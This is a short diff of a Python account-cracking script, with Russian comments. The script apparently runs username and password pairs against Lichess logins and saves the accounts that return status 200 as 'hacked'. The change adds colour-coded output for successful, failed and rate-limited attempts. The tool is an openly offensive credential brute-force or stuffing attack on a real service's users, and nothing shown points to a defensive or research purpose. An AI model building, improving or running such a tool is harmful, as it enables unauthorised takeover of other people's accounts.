@@ -70,7 +70,14 @@ def start(passwords):
 
             #       Выводим статус взлома
             #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
-            print(f"{get_ts()} {r}, {username}: {password}")
+            if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
+                print(green + f"{get_ts()} {r}, {username}: {password}")
+
+            elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
+                print(white + f"{get_ts()} {r}, {username}: {password}")
+
+            elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
+                print(red + f"{get_ts()} {r}, {username}: {password}")
             k += 1
 
             if str(r) == f"<Response [{str(OK_RESPONSE)}]>": # сохраняем взломанные акки
